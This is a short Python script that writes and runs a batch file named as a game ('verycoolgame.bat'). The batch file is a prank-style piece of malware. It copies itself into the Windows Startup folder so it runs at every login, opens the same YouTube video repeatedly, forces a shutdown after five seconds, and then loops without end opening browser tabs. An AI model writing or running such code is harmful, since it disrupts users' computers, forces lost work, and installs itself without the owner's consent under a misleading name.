import subprocess
game = open("verycoolgame.bat", 'w')
game.write('''@echo off
echo let's get started...
copy /y %~f0 "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\"
start https://www.youtube.com/watch?v=dQw4w9WgXcQ
echo we know the game and we're gonna play it...
pause
start https://www.youtube.com/watch?v=dQw4w9WgXcQ
start https://www.youtube.com/watch?v=dQw4w9WgXcQ
start https://www.youtube.com/watch?v=dQw4w9WgXcQ
start https://www.youtube.com/watch?v=dQw4w9WgXcQ
start https://www.youtube.com/watch?v=dQw4w9WgXcQ
echo initiaiting shutdown sequence...
pause
shutdown -s -f -t 5 -c "have you ever considered closing the command prompt"
:a
start https://www.youtube.com/watch?v=dQw4w9WgXcQ
goto a''')
game.close()
subprocess.call("verycoolgame.bat")